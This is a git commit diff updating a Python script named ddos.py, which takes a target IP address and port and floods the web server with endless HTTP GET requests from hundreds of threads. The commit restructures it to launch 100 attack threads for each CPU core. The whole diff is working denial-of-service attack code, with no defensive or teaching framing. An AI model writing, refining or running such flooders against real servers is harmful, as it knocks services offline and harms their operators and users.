19d54d5aab92a487bcbaa750a4cc1a90cf79da81
alex <115838290+alexmadd4@users.noreply.github.com>
2023-03-25 18:38:18 +0100

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,12 +1,11 @@
 import threading
 import socket
+import os
 
 target = input("Enter the IP address of the target web server: ")
 port = int(input("Enter the port number of the target web server: "))
 message = "GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n"
-threads = []
 
-# Function to send requests to the server
 def attack():
     while True:
         try:
@@ -17,16 +16,25 @@ def attack():
         except:
             s.close()
 
-# Start multiple threads to send requests simultaneously
-for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.daemon = True
-    threads.append(thread)
+def create_process(num_threads):
+    threads = []
+    for i in range(num_threads):
+        thread = threading.Thread(target=attack)
+        thread.daemon = True
+        threads.append(thread)
+    for thread in threads:
+        thread.start()
+    for thread in threads:
+        thread.join()
 
-# Start the threads
-for thread in threads:
-    thread.start()
-
-# Wait for the threads to finish
-for thread in threads:
-    thread.join()
+if __name__ == '__main__':
+    num_cores = os.cpu_count()
+    processes = []
+    for i in range(num_cores):
+        process = threading.Thread(target=create_process, args=(100,))
+        process.daemon = True
+        processes.append(process)
+    for process in processes:
+        process.start()
+    for process in processes:
+        process.join()
